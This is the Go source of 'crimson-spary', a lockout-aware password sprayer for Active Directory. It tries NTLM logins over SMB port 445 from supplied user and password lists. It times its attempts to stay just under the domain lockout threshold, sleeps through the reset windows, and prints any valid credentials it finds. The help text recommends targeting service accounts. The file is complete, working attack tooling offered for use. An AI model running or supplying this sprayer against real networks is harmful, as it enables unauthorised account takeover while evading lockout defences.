package main

import (
	"bufio"
	"fmt"
	"github.com/akamensky/argparse"
	"github.com/hirochachacha/go-smb2"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	parser := argparse.NewParser("crimson-spary", "A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
	var userFilePathArg = parser.String("u", "username-file", &argparse.Options{Required: true, Help: "(Required) File of users separated by newlines"})
	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
	var targetArg = parser.String("t", "target", &argparse.Options{Required: true, Help: "(Required) IP or Hostname of target to authenticate against"})
	var lockThresh = parser.Int("a", "Lockout-Threshold", &argparse.Options{Required: true, Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
	var lockThreshTime = parser.Int("l", "Lockout-Reset", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
	var lockTime = parser.Int("r", "Lockout-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute.\n"})
	var bypassWait = parser.Flag("", "bypass-wait", &argparse.Options{Help: "Bypass initial lock threshold reset period"})
	var noHeaderArg = parser.Flag("", "no-stats", &argparse.Options{Default: false, Help: "Suppress stats banner"})
	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - No output (will disable prerun stats) | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})

	err := parser.Parse(os.Args)
	log.SetOutput(os.Stdout)
	if err != nil {
		log.Println(parser.Usage(err))
	} else {
		if *noHeaderArg == false && *verboseArg != 0 {
			preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
		}
		if *bypassWait != true {
			log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with --bypass-wait)", *lockThreshTime)
			time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
		}
		log.Printf("Starting Spray..... ")
		multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
	}

}

func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
	userListLen := len(readFile(usernamePath))
	passwordListLen := len(readFile(passwordPath))
	numberOfRounds := passwordListLen / (lockoutThreshold - 1)
	estimatedMaxTime := numberOfRounds * (lockoutResetTimer + 1)
	if estimatedMaxTime == 0 {
		estimatedMaxTime = lockoutThreshold
	}
	timeLongForm := time.Duration(estimatedMaxTime) * time.Minute
	var verboseDetail string
	switch verbose {
	case 1:
		verboseDetail = "1 - Success Messages Only"
	case 2:
		verboseDetail = "2 - Pauses, Lockout and Success Messages"
	case 3:
		verboseDetail = "3 - Attempts, Pause, Lockout and Success Messages"
	case 4:
		verboseDetail = "4 - Debug Messages"

	}
	fmt.Println()
	fmt.Printf("Imported Users: %d\n", userListLen)
	fmt.Printf("Imported Passwords: %d\n", passwordListLen)
	fmt.Println()
	fmt.Printf("Target Domain: %s\n", domain)
	fmt.Printf("Target Host: %s\n", targetIP)
	fmt.Println()
	fmt.Printf("Lockout Attempt Threshold: %d \n", lockoutThreshold)
	fmt.Printf("Lockout Threshold Reset: %s \n", time.Duration(lockoutResetTimer)*time.Minute)
	fmt.Printf("Lockout Timer: %s \n", time.Duration(lockoutTimer)*time.Minute)
	fmt.Printf("Estimated Max Completion Time (if no lockout occurs): %s\n", timeLongForm)
	fmt.Println()
	fmt.Printf("Verbose Level: %s\n\n", verboseDetail)
	/*
		UserList will not matter if all accounts are tested at once.
		PasswordListLen / lockoutThreshold = roundsOfAttempts
		LockoutResetTimer * roundOfAttempt = Estimated max time if no lockouts occur
	*/
}

func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int64, verbose int) {
	userList := readFile(usernamePath)
	passwordList := readFile(passwordPath)
	resetTimerDuration := lockoutResetTimer + 1
	attemptThreshold := lockoutThreshold - 1
	currentPasswordIndex := 0
	for _, users := range userList {
		for currentPasswordIndex < len(passwordList) {
			result := 4
			for i := 0; i < attemptThreshold; i++ {
				passwordToAttempt := passwordList[currentPasswordIndex+i]
				result = testCred(users, passwordToAttempt, domain, targetIP, verbose)
				if result == 0 {
					break
				} else if result == 2 {
					log.Printf("User account %s is locked out.\n", users)
					break //will reattempt password before incrementing the loop.
				}
				currentPasswordIndex++
			}
			if result == 0 {
				break
			}
			log.Printf("Sleeping for %d mins\n", resetTimerDuration)
			time.Sleep(time.Duration(resetTimerDuration) * time.Minute)

		}
	}

}

func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
	userList := readFile(usernamePath)
	passwordList := readFile(passwordPath)
	var wg sync.WaitGroup
	for x := range userList {
		wg.Add(1)
		userUser := userList[x]
		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer)
		go func() {
			defer wg.Done()
			UserSpray(userUser, passwordList, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer, verbose)
		}()
	}
	wg.Wait()
	log.Println("Crimson Spray Completed")
}

func UserSpray(username string, passwordSlice []string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) string {
	resetTimerDuration := lockoutResetTimer + 1
	attemptThreshold := lockoutThreshold - 2
	currentPasswordIndex := 0
	passwordListLen := len(passwordSlice) - 1
	for currentPasswordIndex < passwordListLen {
		result := 4 //
		for i := 0; i <= attemptThreshold; i++ {
			passwordToAttempt := passwordSlice[currentPasswordIndex]
			result = testCred(username, passwordToAttempt, domain, targetIP, verbose)
			if result == 0 {
				break
			} else if result == 2 {
				if verbose >= 2 {
					log.Printf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1)
				}
				time.Sleep(time.Duration(lockoutTimer+1) * time.Minute)
			}
			currentPasswordIndex++
			if currentPasswordIndex == passwordListLen {
				break
			}
		}
		if result == 0 {
			break
		}
		if verbose >= 2 {
			log.Printf("Threshold for %s resets in %d mins\n", username, resetTimerDuration)
		}
		time.Sleep(time.Duration(resetTimerDuration) * time.Minute)
	}
	return fmt.Sprintf("Done user %s", username)
}

func testCred(name string, passwordGuess string, domainDst string, ip string, verbose int) int {
	/* Return Values
	0 - Log in successful
	1 - Log in failed
	2 - Specified account is locked out
	3 - Reserved
	4 - Default first loop. This should never be returned
	*/
	dstServer := fmt.Sprintf("%s:445", ip)
	if verbose >= 4 {
		log.Printf("Attempting to connect to %s", dstServer)
	}
	conn, err := net.Dial("tcp", dstServer)
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	if verbose >= 4 {
		log.Printf("Connected to %s", dstServer)
		log.Printf("Attempting %s\\%s:%s @ %s --- ", domainDst, name, passwordGuess, dstServer)
	}
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     name,
			Password: passwordGuess,
			Domain:   domainDst,
		},
	}
	_, err = d.Dial(conn)
	if err != nil {
		if verbose >= 4 {
			log.Print(err.Error())
		}
		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
			return 2
		} else {
			if verbose >= 3 {
				log.Printf("Failed %s\\%s:%s\n", domainDst, name, passwordGuess)
			}
			return 1
		}
	} else {
		if verbose >= 1 {
			log.Printf("!!!Found Creds (  %s\\%s:%s  )!!!\n", domainDst, name, passwordGuess)
		}
		return 0
	}
}

func sannityCheckIP(ip string) bool {
	log.Printf("Testing connection to %s\n", ip)
	dstServer := fmt.Sprintf("%s:445", ip)
	_, err := net.Dial("tcp", dstServer)
	if err != nil {
		return false
	} else {
		return true
	}
}

func readFile(filepath string) []string {
	fileBytes, err := os.Open(filepath)
	if err != nil {
		log.Fatalf("Failed to open %s", filepath)
	}
	scanner := bufio.NewScanner(fileBytes)
	scanner.Split(bufio.ScanLines)
	var entries []string
	for scanner.Scan() {
		entries = append(entries, scanner.Text())
	}
	return entries
}

/*
Verbose levels:
0 - No output
1 - Success Only
2 - Lockout Time, Pause Time, Success
3 - All attempts and Timers and Success
4 - Debug
*/